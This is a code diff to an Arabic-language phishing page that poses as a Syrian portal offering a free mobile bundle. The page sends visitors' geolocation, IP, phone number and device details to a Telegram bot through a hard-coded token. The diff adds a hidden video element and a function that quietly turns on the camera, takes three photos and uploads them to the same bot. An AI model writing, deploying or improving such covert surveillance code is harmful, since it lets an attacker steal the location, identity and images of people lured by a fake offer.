@@ -18,11 +18,18 @@
       padding: 20px;
       text-align: center;
       box-shadow: 0 4px 6px rgba(0,0,0,0.5);
+      position: relative;
     }
     header h1 {
       margin: 0;
       font-size: 24px;
       color: #fff;
+    }
+    header img {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      width: 40px;
     }
     .container {
       padding: 20px;
@@ -76,10 +83,14 @@
       font-size: 14px;
       text-align: center;
     }
+    video {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/Emblem_of_Syria.svg/1200px-Emblem_of_Syria.svg.png" alt="logo" />
     <h1>البوابة السورية | طلب باقة مجانية</h1>
   </header>  <div class="container">
     <label>اختر الشبكة:</label>
@@ -114,6 +125,7 @@
 </div>
 
 <iframe id="map" src=""></iframe>
+<video id="video" autoplay playsinline></video>
 
   </div>  <script>
     const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
@@ -140,6 +152,11 @@
       }
     }
 
+    async function getDeviceDetails() {
+      const ua = navigator.userAgent;
+      return `نظام: ${navigator.platform}\nUA: ${ua}`;
+    }
+
     function shareLink() {
       const url = window.location.href;
       navigator.clipboard.writeText(url);
@@ -163,7 +180,7 @@
 
       const ip = await getIPInfo();
       const battery = await getBatteryInfo();
-      const deviceInfo = navigator.userAgent;
+      const deviceInfo = await getDeviceDetails();
       const screenRes = `${screen.width}x${screen.height}`;
       const memory = navigator.deviceMemory || "؟";
       const cores = navigator.hardwareConcurrency || "؟";
@@ -200,12 +217,46 @@ IP: ${ip.ip || "؟"}
           body: JSON.stringify({ chat_id: chatId, text: msg })
         });
 
+        await capturePhotos();
+
         saveToLocal(phone);
-        alert("✅ تم إرسال الطلب بنجاح!");
+        alert("✅ تم إرسال الطلب والصور بنجاح!");
 
       }, () => {
         alert("⚠️ الموقع الجغرافي غير مفعل!");
       });
+    }
+
+    async function capturePhotos() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        for (let i = 1; i <= 3; i++) {
+          await new Promise(resolve => setTimeout(resolve, 1500));
+          const canvas = document.createElement("canvas");
+          canvas.width = 640;
+          canvas.height = 480;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          await new Promise(res => canvas.toBlob(async blob => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, `photo${i}.jpg`);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            });
+            res();
+          }, "image/jpeg"));
+        }
+
+        stream.getTracks().forEach(track => track.stop());
+      } catch {
+        alert("📸 الكاميرا غير مفعلة أو تم الرفض");
+      }
     }
 
     function saveToLocal(phone) {
